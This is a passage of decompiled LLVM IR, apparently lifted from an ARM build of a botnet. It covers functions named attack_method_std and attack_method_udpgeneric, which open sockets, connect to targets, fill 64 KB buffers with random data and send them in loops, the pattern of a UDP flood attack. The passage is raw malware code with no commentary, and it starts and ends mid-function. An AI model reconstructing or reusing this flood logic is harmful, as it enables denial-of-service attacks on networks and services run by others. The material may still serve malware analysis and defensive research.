  %v3_8a50 = udiv i32 %v0_8a50, 65536
  store i32 %v3_8a50, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8a58 = load i32, i32* @r4, align 4
  %v9_8a58 = icmp eq i32 %v3_8a50, %v1_8a58
  br i1 %v9_8a58, label %dec_label_pc_8a88, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_8a70 = udiv i32 %v0_8a50, 16777216
  store i32 %v4_8a70, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8a98

dec_label_pc_8a88:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_8a88 = call i32 @rand_next()
  br label %dec_label_pc_8a98

dec_label_pc_8a98:                                ; preds = %bb, %dec_label_pc_8a88
  %v0_8a7c10 = urem i32 %v5_8a4c, 256
  %v0_8a98 = load i32, i32* @r7, align 4
  %v2_8a98 = icmp eq i32 %v0_8a98, 0
  br i1 %v2_8a98, label %dec_label_pc_8bd8, label %dec_label_pc_8aa0

dec_label_pc_8aa0:                                ; preds = %dec_label_pc_8a98
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8b4c = udiv i32 %v3_8a00, 256
  %v1_8b48 = mul i32 %v5_89f8, 256
  %v4_8b50 = and i32 %v1_8b48, 65280
  %v5_8b50 = or i32 %v4_8b50, %v3_8b4c
  %v2_8ad0 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_8b30

dec_label_pc_8ab0:                                ; preds = %bb51, %dec_label_pc_8b70
  %v3_8abc = call i32 @socket(i32 2, i32 2, i32 17)
  %v7_8ac4 = icmp eq i32 %v3_8abc, -1
  %v0_8ac8 = load i32, i32* @sb, align 4
  %v1_8ac8 = add i32 %v0_8ac8, 1
  store i32 %v1_8ac8, i32* @sb, align 4
  %v0_8acc = load i32, i32* @fp, align 4
  %v1_8acc = add i32 %v0_8acc, 24
  store i32 %v1_8acc, i32* @fp, align 4
  %v2_8ad8 = load i32, i32* @r8, align 4
  %v3_8ad8 = add i32 %v2_8ad8, %stack_var_-60.0
  %v4_8ad8 = inttoptr i32 %v3_8ad8 to i32*
  store i32 %v3_8abc, i32* %v4_8ad8, align 4
  br i1 %v7_8ac4, label %dec_label_pc_8bcc, label %dec_label_pc_8ae0

dec_label_pc_8ae0:                                ; preds = %dec_label_pc_8ab0
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_8af8 = call i32 @bind(i32 %v3_8abc, i32 %v2_8ad0, i32 16)
  %v0_8afc = load i32, i32* @r6, align 4
  %v1_8afc = add i32 %v0_8afc, 20
  %v2_8afc = inttoptr i32 %v1_8afc to i8*
  %v3_8afc = load i8, i8* %v2_8afc, align 1
  %v4_8afc = zext i8 %v3_8afc to i32
  store i32 %v4_8afc, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8afc, 32
  br i1 %tmp, label %dec_label_pc_8b84, label %dec_label_pc_8b08

dec_label_pc_8b08:                                ; preds = %dec_label_pc_8ae0, %dec_label_pc_8b84
  %v0_8b0c = phi i32 [ %v0_8afc, %dec_label_pc_8ae0 ], [ %v0_8b0c.pre, %dec_label_pc_8b84 ]
  %v1_8b10 = load i32, i32* @r8, align 4
  %v2_8b10 = add i32 %v1_8b10, %stack_var_-60.0
  %v3_8b10 = inttoptr i32 %v2_8b10 to i32*
  %v4_8b10 = load i32, i32* %v3_8b10, align 4
  %v3_8b18 = call i32 @__libc_connect(i32 %v4_8b10, i32 %v0_8b0c, i32 16)
  %v0_8b20 = load i32, i32* @sb, align 4
  %v1_8b20 = load i32, i32* @r7, align 4
  %v9_8b20 = icmp eq i32 %v0_8b20, %v1_8b20
  %v1_8b24 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8b24, i32* %r3.global-to-local, align 4
  br i1 %v9_8b20, label %dec_label_pc_8bd8, label %dec_label_pc_8b30

dec_label_pc_8b30:                                ; preds = %dec_label_pc_8b08, %dec_label_pc_8aa0
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8aa0 ], [ %v1_8b24, %dec_label_pc_8b08 ]
  store i32 65535, i32* @r4, align 4
  %v2_8b40 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_8b50, i32* %r3.global-to-local, align 4
  %v1_8b5c = load i32, i32* @r4, align 4
  %v9_8b5c = icmp eq i32 %v3_8a00, %v1_8b5c
  %v1_8b60 = load i32, i32* @fp, align 4
  %v2_8b60 = add i32 %v1_8b60, %arg2
  store i32 %v2_8b60, i32* @r6, align 4
  %v2_8b64 = load i32, i32* @sl, align 4
  %v3_8b64 = add i32 %v2_8b64, %stack_var_-60.0
  %v4_8b64 = inttoptr i32 %v3_8b64 to i32*
  store i32 %v2_8b40, i32* %v4_8b64, align 4
  br i1 %v9_8b5c, label %dec_label_pc_8b70, label %bb51

bb51:                                             ; preds = %dec_label_pc_8b30
  %v1_8b68 = load i32, i32* %r3.global-to-local, align 4
  %v2_8b68 = trunc i32 %v1_8b68 to i16
  %v3_8b68 = load i32, i32* @r6, align 4
  %v4_8b68 = add i32 %v3_8b68, 2
  %v5_8b68 = inttoptr i32 %v4_8b68 to i16*
  store i16 %v2_8b68, i16* %v5_8b68, align 2
  br label %dec_label_pc_8ab0

dec_label_pc_8b70:                                ; preds = %dec_label_pc_8b30
  %v0_8b70 = call i32 @rand_next()
  %v1_8b70 = trunc i32 %v0_8b70 to i16
  %v0_8b78 = load i32, i32* @fp, align 4
  %v2_8b78 = add i32 %v0_8b78, %arg2
  store i32 %v2_8b78, i32* @r6, align 4
  %v4_8b7c = add i32 %v2_8b78, 2
  %v5_8b7c = inttoptr i32 %v4_8b7c to i16*
  store i16 %v1_8b70, i16* %v5_8b7c, align 2
  br label %dec_label_pc_8ab0

dec_label_pc_8b84:                                ; preds = %dec_label_pc_8ae0
  %v1_8b84 = add i32 %v0_8afc, 16
  %v2_8b84 = inttoptr i32 %v1_8b84 to i32*
  %v3_8b84 = load i32, i32* %v2_8b84, align 4
  store i32 %v3_8b84, i32* @r4, align 4
  %v0_8b88 = call i32 @rand_next()
  %v0_8b8c = load i32, i32* @r4, align 4
  %v1_8b8c = and i32 %v0_8b8c, 16711680
  %v3_8b90 = udiv i32 %v0_8b8c, 16777216
  %v4_8b94 = udiv i32 %v1_8b8c, 256
  %v5_8b94 = or i32 %v4_8b94, %v3_8b90
  %v1_8b98 = and i32 %v0_8b8c, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_8b98, i32* %r3.global-to-local, align 4
  %v4_8b9c = mul i32 %v1_8b98, 256
  %v5_8b9c = or i32 %v5_8b94, %v4_8b9c
  %v0_8ba0 = load i32, i32* @r6, align 4
  %v1_8ba0 = add i32 %v0_8ba0, 20
  %v2_8ba0 = inttoptr i32 %v1_8ba0 to i8*
  %v3_8ba0 = load i8, i8* %v2_8ba0, align 1
  %v4_8ba0 = zext i8 %v3_8ba0 to i32
  %v4_8ba4 = mul i32 %v0_8b8c, 16777216
  %v5_8ba4 = or i32 %v5_8b9c, %v4_8ba4
  %v7_8ba8 = lshr i32 %v0_8b88, %v4_8ba0
  %v8_8ba8 = add i32 %v7_8ba8, %v5_8ba4
  %v5_8bc0 = call i32 @llvm.bswap.i32(i32 %v8_8ba8)
  store i32 %v5_8bc0, i32* %r3.global-to-local, align 4
  %v2_8bc4 = add i32 %v0_8ba0, 4
  %v3_8bc4 = inttoptr i32 %v2_8bc4 to i32*
  store i32 %v5_8bc0, i32* %v3_8bc4, align 4
  %v0_8b0c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8b08

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_8ab0
  store i32 %v18_89ac, i32* %sb.global-to-local, align 4
  ret i32 %v3_8abc

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8b08, %dec_label_pc_8a98
  %v1_8c1822 = phi i32 [ 0, %dec_label_pc_8a98 ], [ %v0_8b20, %dec_label_pc_8b08 ]
  %v2_8bdc = icmp eq i32 %v0_8a7c10, 0
  br i1 %v2_8bdc, label %dec_label_pc_8bfc.outer, label %dec_label_pc_8c14

dec_label_pc_8bec:                                ; preds = %dec_label_pc_8bfc
  store i32 %v1_8bf0, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8bec = load i32, i32* @r8, align 4
  %v4_8bec = mul i32 %v1_8bf0, 4
  %v5_8bec = add i32 %v0_8bec, %v4_8bec
  %v6_8bec = inttoptr i32 %v5_8bec to i32*
  %v7_8bec = load i32, i32* %v6_8bec, align 4
  %v0_8bf0 = load i32, i32* @sl, align 4
  %v5_8bf0 = add i32 %v0_8bf0, %v4_8bec
  %v6_8bf0 = inttoptr i32 %v5_8bf0 to i32*
  %v7_8bf0 = load i32, i32* %v6_8bf0, align 4
  %v4_8bf4 = call i32 @__libc_send(i32 %v7_8bec, i32 %v7_8bf0, i32 %v0_8c00, i32 16384)
  %v0_8bf8 = load i32, i32* @r4, align 4
  %v1_8bf8 = add i32 %v0_8bf8, 1
  %v0_8bfc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8bfc.outer

dec_label_pc_8bfc.outer:                          ; preds = %dec_label_pc_8bd8, %dec_label_pc_8bec
  %v0_8bfc.ph = phi i32 [ %v0_8bfc.pre.pre, %dec_label_pc_8bec ], [ %v1_8c1822, %dec_label_pc_8bd8 ]
  %v1_8bf0.ph = phi i32 [ %v1_8bf8, %dec_label_pc_8bec ], [ 0, %dec_label_pc_8bd8 ]
  %v0_8c00 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8bfc

dec_label_pc_8bfc:                                ; preds = %dec_label_pc_8bfc.outer, %dec_label_pc_8bfc
  %v1_8bf0 = phi i32 [ 0, %dec_label_pc_8bfc ], [ %v1_8bf0.ph, %dec_label_pc_8bfc.outer ]
  %v8_8c08 = icmp sgt i32 %v0_8bfc.ph, %v1_8bf0
  br i1 %v8_8c08, label %dec_label_pc_8bec, label %dec_label_pc_8bfc

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c18, %dec_label_pc_8bd8
  %v1_8c1821 = phi i32 [ %v1_8c1822, %dec_label_pc_8bd8 ], [ %v1_8c18, %dec_label_pc_8c18 ]
  br label %dec_label_pc_8c18

dec_label_pc_8c18:                                ; preds = %dec_label_pc_8c24, %dec_label_pc_8c14
  %v1_8c18 = phi i32 [ %v1_8c1821, %dec_label_pc_8c14 ], [ %v1_8c18.pre, %dec_label_pc_8c24 ]
  %v1_8c24 = phi i32 [ 0, %dec_label_pc_8c14 ], [ %v1_8c44, %dec_label_pc_8c24 ]
  store i32 %v1_8c24, i32* @r6, align 4
  %v6_8c20 = icmp slt i32 %v1_8c24, %v1_8c18
  br i1 %v6_8c20, label %dec_label_pc_8c24, label %dec_label_pc_8c14

dec_label_pc_8c24:                                ; preds = %dec_label_pc_8c18
  %v0_8c1c = load i32, i32* @r5, align 4
  %v0_8c24 = load i32, i32* @sl, align 4
  %v4_8c24 = mul i32 %v1_8c24, 4
  %v5_8c24 = add i32 %v0_8c24, %v4_8c24
  %v6_8c24 = inttoptr i32 %v5_8c24 to i32*
  %v7_8c24 = load i32, i32* %v6_8c24, align 4
  store i32 %v7_8c24, i32* @r4, align 4
  %v2_8c2c = inttoptr i32 %v7_8c24 to i16*
  %v3_8c2c = call i32 @rand_str(i16* %v2_8c2c, i32 %v0_8c1c)
  %v0_8c30 = load i32, i32* @r8, align 4
  %v1_8c30 = load i32, i32* @r6, align 4
  %v4_8c30 = mul i32 %v1_8c30, 4
  %v5_8c30 = add i32 %v4_8c30, %v0_8c30
  %v6_8c30 = inttoptr i32 %v5_8c30 to i32*
  %v7_8c30 = load i32, i32* %v6_8c30, align 4
  %v0_8c34 = load i32, i32* @r4, align 4
  %v0_8c38 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8c40 = call i32 @__libc_send(i32 %v7_8c30, i32 %v0_8c34, i32 %v0_8c38, i32 16384)
  %v0_8c44 = load i32, i32* @r6, align 4
  %v1_8c44 = add i32 %v0_8c44, 1
  %v1_8c18.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8c18

; uselistorder directives
  uselistorder i32 %v1_8c18, { 1, 0 }
  uselistorder i32 %v1_8bf0, { 2, 1, 0 }
  uselistorder i32 %v5_8bc0, { 1, 0 }
  uselistorder i32 %v0_8b8c, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8afc, { 1, 0, 2 }
  uselistorder i32 %v3_8abc, { 1, 2, 3, 0 }
  uselistorder i32 %v3_8a50, { 1, 0 }
  uselistorder i32 %v3_8a00, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8bfc, { 1, 0 }
  uselistorder label %dec_label_pc_8bfc.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8b08, { 1, 0 }
  uselistorder label %dec_label_pc_8ab0, { 1, 0 }
  uselistorder label %dec_label_pc_8a98, { 1, 0 }
}

define i32 @attack_method_std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_8c4c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8c68 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_8c68, i32* @sl, align 4
  %v0_8c74 = load i32, i32* @r7, align 4
  %v2_8c78 = call i32 @calloc(i32 %v0_8c74, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_8c84 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_8c78, i32* @r8, align 4
  %v0_8c94 = load i32, i32* @r5, align 4
  %v4_8c98 = inttoptr i32 %v0_8c84 to i32*
  %v5_8c98 = call i32 @attack_get_opt_int(i32 %v0_8c94, i32* %v4_8c98, i32 7, i32 65535)
  %v3_8ca0 = urem i32 %v5_8c98, 65536
  %v0_8ca4 = load i32, i32* @r6, align 4
  %v0_8cac = load i32, i32* @r4, align 4
  store i32 %v0_8cac, i32* %r3.global-to-local, align 4
  %v0_8cb0 = load i32, i32* @r5, align 4
  %v5_8cb8 = inttoptr i32 %v0_8ca4 to i32*
  %v6_8cb8 = call i32 @attack_get_opt_int(i32 %v0_8cb0, i32* %v5_8cb8, i32 6, i32 %v0_8cac)
  %v0_8cbc = load i32, i32* @r6, align 4
  %v3_8cc0 = mul i32 %v6_8cb8, 65536
  store i32 %v3_8cc0, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_8ccc = load i32, i32* @r5, align 4
  %v4_8cd0 = inttoptr i32 %v0_8cbc to i32*
  %v5_8cd0 = call i32 @attack_get_opt_int(i32 %v0_8ccc, i32* %v4_8cd0, i32 0, i32 1024)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8ce0 = load i32, i32* @r6, align 4
  %v0_8ce4 = load i32, i32* @r5, align 4
  %v3_8ce8 = urem i32 %v5_8cd0, 65536
  store i32 %v3_8ce8, i32* @r5, align 4
  %v4_8cec = inttoptr i32 %v0_8ce0 to i32*
  %v5_8cec = call i32 @attack_get_opt_int(i32 %v0_8ce4, i32* %v4_8cec, i32 1, i32 1)
  %v0_8cf0 = load i32, i32* %sb.global-to-local, align 4
  %v3_8cf0 = udiv i32 %v0_8cf0, 65536
  store i32 %v3_8cf0, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8cf8 = load i32, i32* @r4, align 4
  %v9_8cf8 = icmp eq i32 %v3_8cf0, %v1_8cf8
  br i1 %v9_8cf8, label %dec_label_pc_8d28, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_8d10 = udiv i32 %v0_8cf0, 16777216
  store i32 %v4_8d10, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8d38

dec_label_pc_8d28:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_8d28 = call i32 @rand_next()
  br label %dec_label_pc_8d38

dec_label_pc_8d38:                                ; preds = %bb, %dec_label_pc_8d28
  %v0_8d1c10 = urem i32 %v5_8cec, 256
  %v0_8d38 = load i32, i32* @r7, align 4
  %v2_8d38 = icmp eq i32 %v0_8d38, 0
  br i1 %v2_8d38, label %dec_label_pc_8e78, label %dec_label_pc_8d40

dec_label_pc_8d40:                                ; preds = %dec_label_pc_8d38
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8dec = udiv i32 %v3_8ca0, 256
  %v1_8de8 = mul i32 %v5_8c98, 256
  %v4_8df0 = and i32 %v1_8de8, 65280
  %v5_8df0 = or i32 %v4_8df0, %v3_8dec
  %v2_8d70 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_8dd0

dec_label_pc_8d50:                                ; preds = %bb51, %dec_label_pc_8e10
  %v3_8d5c = call i32 @socket(i32 2, i32 2, i32 0)
  %v7_8d64 = icmp eq i32 %v3_8d5c, -1
  %v0_8d68 = load i32, i32* @sb, align 4
  %v1_8d68 = add i32 %v0_8d68, 1
  store i32 %v1_8d68, i32* @sb, align 4
  %v0_8d6c = load i32, i32* @fp, align 4
  %v1_8d6c = add i32 %v0_8d6c, 24
  store i32 %v1_8d6c, i32* @fp, align 4
  %v2_8d78 = load i32, i32* @r8, align 4
  %v3_8d78 = add i32 %v2_8d78, %stack_var_-60.0
  %v4_8d78 = inttoptr i32 %v3_8d78 to i32*
  store i32 %v3_8d5c, i32* %v4_8d78, align 4
  br i1 %v7_8d64, label %dec_label_pc_8e6c, label %dec_label_pc_8d80

dec_label_pc_8d80:                                ; preds = %dec_label_pc_8d50
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_8d98 = call i32 @bind(i32 %v3_8d5c, i32 %v2_8d70, i32 16)
  %v0_8d9c = load i32, i32* @r6, align 4
  %v1_8d9c = add i32 %v0_8d9c, 20
  %v2_8d9c = inttoptr i32 %v1_8d9c to i8*
  %v3_8d9c = load i8, i8* %v2_8d9c, align 1
  %v4_8d9c = zext i8 %v3_8d9c to i32
  store i32 %v4_8d9c, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8d9c, 32
  br i1 %tmp, label %dec_label_pc_8e24, label %dec_label_pc_8da8

dec_label_pc_8da8:                                ; preds = %dec_label_pc_8d80, %dec_label_pc_8e24
  %v0_8dac = phi i32 [ %v0_8d9c, %dec_label_pc_8d80 ], [ %v0_8dac.pre, %dec_label_pc_8e24 ]
  %v1_8db0 = load i32, i32* @r8, align 4
  %v2_8db0 = add i32 %v1_8db0, %stack_var_-60.0
  %v3_8db0 = inttoptr i32 %v2_8db0 to i32*
  %v4_8db0 = load i32, i32* %v3_8db0, align 4
  %v3_8db8 = call i32 @__libc_connect(i32 %v4_8db0, i32 %v0_8dac, i32 16)
  %v0_8dc0 = load i32, i32* @sb, align 4
  %v1_8dc0 = load i32, i32* @r7, align 4
  %v9_8dc0 = icmp eq i32 %v0_8dc0, %v1_8dc0
  %v1_8dc4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8dc4, i32* %r3.global-to-local, align 4
  br i1 %v9_8dc0, label %dec_label_pc_8e78, label %dec_label_pc_8dd0

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8da8, %dec_label_pc_8d40
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8d40 ], [ %v1_8dc4, %dec_label_pc_8da8 ]
  store i32 65535, i32* @r4, align 4
  %v2_8de0 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_8df0, i32* %r3.global-to-local, align 4
  %v1_8dfc = load i32, i32* @r4, align 4
  %v9_8dfc = icmp eq i32 %v3_8ca0, %v1_8dfc
  %v1_8e00 = load i32, i32* @fp, align 4
  %v2_8e00 = add i32 %v1_8e00, %arg2
  store i32 %v2_8e00, i32* @r6, align 4
  %v2_8e04 = load i32, i32* @sl, align 4
  %v3_8e04 = add i32 %v2_8e04, %stack_var_-60.0
  %v4_8e04 = inttoptr i32 %v3_8e04 to i32*
  store i32 %v2_8de0, i32* %v4_8e04, align 4
  br i1 %v9_8dfc, label %dec_label_pc_8e10, label %bb51

bb51:                                             ; preds = %dec_label_pc_8dd0
  %v1_8e08 = load i32, i32* %r3.global-to-local, align 4
  %v2_8e08 = trunc i32 %v1_8e08 to i16
  %v3_8e08 = load i32, i32* @r6, align 4
  %v4_8e08 = add i32 %v3_8e08, 2
  %v5_8e08 = inttoptr i32 %v4_8e08 to i16*
  store i16 %v2_8e08, i16* %v5_8e08, align 2
  br label %dec_label_pc_8d50

dec_label_pc_8e10:                                ; preds = %dec_label_pc_8dd0
  %v0_8e10 = call i32 @rand_next()
  %v1_8e10 = trunc i32 %v0_8e10 to i16
  %v0_8e18 = load i32, i32* @fp, align 4
  %v2_8e18 = add i32 %v0_8e18, %arg2
  store i32 %v2_8e18, i32* @r6, align 4
  %v4_8e1c = add i32 %v2_8e18, 2
  %v5_8e1c = inttoptr i32 %v4_8e1c to i16*
  store i16 %v1_8e10, i16* %v5_8e1c, align 2
  br label %dec_label_pc_8d50

dec_label_pc_8e24:                                ; preds = %dec_label_pc_8d80
  %v1_8e24 = add i32 %v0_8d9c, 16
  %v2_8e24 = inttoptr i32 %v1_8e24 to i32*
  %v3_8e24 = load i32, i32* %v2_8e24, align 4
  store i32 %v3_8e24, i32* @r4, align 4
  %v0_8e28 = call i32 @rand_next()
  %v0_8e2c = load i32, i32* @r4, align 4
  %v1_8e2c = and i32 %v0_8e2c, 16711680
  %v3_8e30 = udiv i32 %v0_8e2c, 16777216
  %v4_8e34 = udiv i32 %v1_8e2c, 256
  %v5_8e34 = or i32 %v4_8e34, %v3_8e30
  %v1_8e38 = and i32 %v0_8e2c, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_8e38, i32* %r3.global-to-local, align 4
  %v4_8e3c = mul i32 %v1_8e38, 256
  %v5_8e3c = or i32 %v5_8e34, %v4_8e3c
  %v0_8e40 = load i32, i32* @r6, align 4
  %v1_8e40 = add i32 %v0_8e40, 20
  %v2_8e40 = inttoptr i32 %v1_8e40 to i8*
  %v3_8e40 = load i8, i8* %v2_8e40, align 1
  %v4_8e40 = zext i8 %v3_8e40 to i32
  %v4_8e44 = mul i32 %v0_8e2c, 16777216
  %v5_8e44 = or i32 %v5_8e3c, %v4_8e44
  %v7_8e48 = lshr i32 %v0_8e28, %v4_8e40
  %v8_8e48 = add i32 %v7_8e48, %v5_8e44
  %v5_8e60 = call i32 @llvm.bswap.i32(i32 %v8_8e48)
  store i32 %v5_8e60, i32* %r3.global-to-local, align 4
  %v2_8e64 = add i32 %v0_8e40, 4
  %v3_8e64 = inttoptr i32 %v2_8e64 to i32*
  store i32 %v5_8e60, i32* %v3_8e64, align 4
  %v0_8dac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8da8

dec_label_pc_8e6c:                                ; preds = %dec_label_pc_8d50
  store i32 %v18_8c4c, i32* %sb.global-to-local, align 4
  ret i32 %v3_8d5c

dec_label_pc_8e78:                                ; preds = %dec_label_pc_8da8, %dec_label_pc_8d38
  %v1_8eb822 = phi i32 [ 0, %dec_label_pc_8d38 ], [ %v0_8dc0, %dec_label_pc_8da8 ]
  %v2_8e7c = icmp eq i32 %v0_8d1c10, 0
  br i1 %v2_8e7c, label %dec_label_pc_8e9c.outer, label %dec_label_pc_8eb4

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e9c
  store i32 %v1_8e90, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8e8c = load i32, i32* @r8, align 4
  %v4_8e8c = mul i32 %v1_8e90, 4
  %v5_8e8c = add i32 %v0_8e8c, %v4_8e8c
  %v6_8e8c = inttoptr i32 %v5_8e8c to i32*
  %v7_8e8c = load i32, i32* %v6_8e8c, align 4
  %v0_8e90 = load i32, i32* @sl, align 4
  %v5_8e90 = add i32 %v0_8e90, %v4_8e8c
  %v6_8e90 = inttoptr i32 %v5_8e90 to i32*
  %v7_8e90 = load i32, i32* %v6_8e90, align 4
  %v4_8e94 = call i32 @__libc_send(i32 %v7_8e8c, i32 %v7_8e90, i32 %v0_8ea0, i32 16384)
  %v0_8e98 = load i32, i32* @r4, align 4
  %v1_8e98 = add i32 %v0_8e98, 1
  %v0_8e9c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e9c.outer

dec_label_pc_8e9c.outer:                          ; preds = %dec_label_pc_8e78, %dec_label_pc_8e8c
  %v0_8e9c.ph = phi i32 [ %v0_8e9c.pre.pre, %dec_label_pc_8e8c ], [ %v1_8eb822, %dec_label_pc_8e78 ]
  %v1_8e90.ph = phi i32 [ %v1_8e98, %dec_label_pc_8e8c ], [ 0, %dec_label_pc_8e78 ]
  %v0_8ea0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8e9c

dec_label_pc_8e9c:                                ; preds = %dec_label_pc_8e9c.outer, %dec_label_pc_8e9c
  %v1_8e90 = phi i32 [ 0, %dec_label_pc_8e9c ], [ %v1_8e90.ph, %dec_label_pc_8e9c.outer ]
  %v8_8ea8 = icmp sgt i32 %v0_8e9c.ph, %v1_8e90
  br i1 %v8_8ea8, label %dec_label_pc_8e8c, label %dec_label_pc_8e9c

dec_label_pc_8eb4:                                ; preds = %dec_label_pc_8eb8, %dec_label_pc_8e78
  %v1_8eb821 = phi i32 [ %v1_8eb822, %dec_label_pc_8e78 ], [ %v1_8eb8, %dec_label_pc_8eb8 ]
  br label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8ec4, %dec_label_pc_8eb4
  %v1_8eb8 = phi i32 [ %v1_8eb821, %dec_label_pc_8eb4 ], [ %v1_8eb8.pre, %dec_label_pc_8ec4 ]
  %v1_8ec4 = phi i32 [ 0, %dec_label_pc_8eb4 ], [ %v1_8ee4, %dec_label_pc_8ec4 ]
  store i32 %v1_8ec4, i32* @r6, align 4
  %v6_8ec0 = icmp slt i32 %v1_8ec4, %v1_8eb8
  br i1 %v6_8ec0, label %dec_label_pc_8ec4, label %dec_label_pc_8eb4

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8eb8
  %v0_8ebc = load i32, i32* @r5, align 4
  %v0_8ec4 = load i32, i32* @sl, align 4
  %v4_8ec4 = mul i32 %v1_8ec4, 4
  %v5_8ec4 = add i32 %v0_8ec4, %v4_8ec4
  %v6_8ec4 = inttoptr i32 %v5_8ec4 to i32*
  %v7_8ec4 = load i32, i32* %v6_8ec4, align 4
  store i32 %v7_8ec4, i32* @r4, align 4
  %v2_8ecc = inttoptr i32 %v7_8ec4 to i16*
  %v3_8ecc = call i32 @rand_str(i16* %v2_8ecc, i32 %v0_8ebc)
  %v0_8ed0 = load i32, i32* @r8, align 4
  %v1_8ed0 = load i32, i32* @r6, align 4
  %v4_8ed0 = mul i32 %v1_8ed0, 4
  %v5_8ed0 = add i32 %v4_8ed0, %v0_8ed0
  %v6_8ed0 = inttoptr i32 %v5_8ed0 to i32*
  %v7_8ed0 = load i32, i32* %v6_8ed0, align 4
  %v0_8ed4 = load i32, i32* @r4, align 4
  %v0_8ed8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8ee0 = call i32 @__libc_send(i32 %v7_8ed0, i32 %v0_8ed4, i32 %v0_8ed8, i32 16384)
  %v0_8ee4 = load i32, i32* @r6, align 4
  %v1_8ee4 = add i32 %v0_8ee4, 1
  %v1_8eb8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8eb8

; uselistorder directives
  uselistorder i32 %v1_8eb8, { 1, 0 }
  uselistorder i32 %v1_8e90, { 2, 1, 0 }
  uselistorder i32 %v5_8e60, { 1, 0 }
  uselistorder i32 %v0_8e2c, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8d9c, { 1, 0, 2 }
  uselistorder i32 %v3_8d5c, { 1, 2, 3, 0 }
  uselistorder i32 %v3_8cf0, { 1, 0 }
  uselistorder i32 %v3_8ca0, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8e9c, { 1, 0 }
  uselistorder label %dec_label_pc_8e9c.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8da8, { 1, 0 }
  uselistorder label %dec_label_pc_8d50, { 1, 0 }
  uselistorder label %dec_label_pc_8d38, { 1, 0 }
}

define i32 @attack_method_udpgeneric(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
